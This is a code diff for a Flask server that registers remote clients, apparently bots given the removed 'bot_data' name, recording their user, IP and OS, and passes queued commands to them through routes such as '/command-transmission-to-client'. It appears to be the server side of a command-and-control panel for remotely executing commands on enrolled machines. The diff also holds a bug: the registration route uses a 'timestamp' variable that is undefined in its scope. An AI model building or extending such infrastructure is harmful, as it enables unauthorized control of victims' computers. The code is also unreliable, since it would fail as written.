@@ -38,12 +38,12 @@ class Admin(db.Model):
 # Client Data Table
 class ClientData(db.Model):
     client_id = db.Column(db.String(64), primary_key=True)  # Unique client ID
-    hostname = db.Column(db.String(128), nullable=False)
+    user = db.Column(db.String(128), nullable=False)
     nickname = db.Column(db.String(128), nullable=False)
     ip = db.Column(db.String(64), nullable=False)
     os = db.Column(db.String(128), nullable=False)
-    registered_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)  # Registration timestamp
-    last_active = db.Column(db.DateTime, default=datetime.datetime.utcnow)  # Last active timestamp
+    registered_at = db.Column(db.DateTime)  # Registration timestamp
+    last_active = db.Column(db.DateTime)  # Last active timestamp
 
     def __repr__(self):
         return f"<ClientData {self.client_id}>"
@@ -161,9 +161,55 @@ def dashboard(decoded_token):
     return render_template("dashboard.html", role=role)
 
 
-@app.route('/api/registerClient', methods=['POST'])
-def registrationFunction():
-    bot_data = request.json()
+# Function to generate a random UUID with 6 characters
+def generate_client_id():
+    random_uuid = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
+    timestamp = datetime.datetime.utcnow()
+    timestampForClientID = timestamp.strftime('%Y%m%d%H%M%S')
+    return f"{random_uuid}-{timestampForClientID}"
+
+# Sample route for client registration
+@app.route('/api/clientRegistration', methods=['POST'])
+def client_registration():
+    data = request.get_json()
+
+    # Extract client details from request
+    user = data.get('user')
+    nickname = data.get('nickname')
+    ip = data.get('ip')
+    os = data.get('os')
+
+    # Generate a unique client_id (random 6 characters + timestamp)
+    client_id = generate_client_id()
+
+    # Calculate the registration date (current UTC time)
+    reg_date = datetime.datetime.utcnow()
+
+    # Save the new client data to the database
+    new_client = ClientData(
+        client_id=client_id,
+        user=user,
+        nickname=nickname,
+        ip=ip,
+        os=os,
+        registered_at=timestamp,
+        last_active=reg_date
+    )
+
+    try:
+        # Add the new client to the session and commit it to the database
+        db.session.add(new_client)
+        db.session.commit()
+        print(f"New client registered: {client_id}, User: {user}, IP: {ip}, OS: {os}, Registered at: {reg_date}")
+
+        # Return the client_id and registration date as a response
+        return jsonify({"client_id": client_id, "reg_date": reg_date.strftime('%Y-%m-%d %H:%M:%S')}), 201
+
+    except Exception as e:
+        db.session.rollback()  # Rollback the session in case of error
+        print(f"Error saving client data: {e}")
+        return jsonify({"error": "An error occurred while registering the client."}), 500
+
 
 
 @app.route('/input-command-to-execute-from-web', methods=['POST'])
@@ -179,6 +225,10 @@ def execute_command():
 
 @app.route('/command-transmission-to-client', methods=['GET'])
 def receive_command():
+    client_id = request.args.get('clientID')  # Get the clientID from the query string
+    if not client_id:
+        return jsonify({"error": "clientID is required"}), 400  # Return an error if clientID is not provided
+
     global command_to_execute
     if command_to_execute:
         cmd = command_to_execute
